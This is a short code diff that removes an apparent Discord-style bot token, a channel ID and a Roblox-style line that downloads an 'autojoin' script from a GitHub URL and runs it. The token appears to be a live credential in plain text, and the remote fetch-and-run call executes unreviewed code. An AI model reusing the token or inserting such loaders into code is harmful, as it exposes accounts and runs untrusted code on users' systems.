@@ -1,5 +1,1 @@
-token = "MTM1NzI0MzYxNTQwNzI0MzMwNQ.Gn9m0m.hYGtWXZ7hv5MOZH5swnVlqs_kHUjaCdhDwpFVw"
-channelId = "1357281582351777937"
-delay = 0.1
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/yurigameplahy753/bvfjhmnhjg/refs/heads/main/autojoin'))()
